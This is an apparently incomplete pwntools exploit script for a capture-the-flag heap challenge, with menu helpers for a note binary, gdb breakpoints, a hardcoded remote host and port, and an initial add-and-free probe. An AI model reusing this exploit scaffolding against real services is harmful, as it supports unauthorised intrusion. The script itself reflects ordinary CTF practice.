#!/usr/bin/env python3
from pwn import *

context.terminal = ['cmd.exe', '/c', 'start', 'wsl.exe', '-d', 'Debian', 'bash', '-c']
context.arch = 'amd64'
host = '34.143.130.87'
port = 4096
elf_name = './chall_patched'
elf = ELF(elf_name)
libc = ELF('./libc.so.6')
# b *generate_name + 93
# b *add + 317
script = '''
define hook-stop
tele &gNotes
tele &gSize
vmmap
end
b *main + 109
b *main + 121
b *main + 133
b *main + 145
c
'''
# script += 'c\n'*200
if args.LOCAL:
    p = process(elf_name)
elif args.GDB:
    p = process(elf_name)
    gdb.attach(p, gdbscript=script)
else:
    p = remote(host, port)

def add(idx, size, data):
    p.sendlineafter(b'Your choice : ', b'1')
    p.sendlineafter(b'Index: ', str(idx).encode())
    p.sendlineafter(b'Size: ', str(size).encode())
    p.sendafter(b'Write something to your note: ', data)
def edit(idx, data):
    p.sendlineafter(b'Your choice : ', b'2')
    p.sendlineafter(b'Index: ', str(idx).encode())
    p.sendafter(b'Write your new note: ', data)
def show(idx):
    p.sendlineafter(b'Your choice : ', b'3')
    p.sendlineafter(b'Which one to open? ', str(idx).encode())
def free(idx):
    p.sendlineafter(b'Your choice : ', b'4')
    p.sendlineafter(b'Index: ', str(idx).encode())

add(0x100, 0x2000, b'aaaa\n')
free(0)

p.interactive()
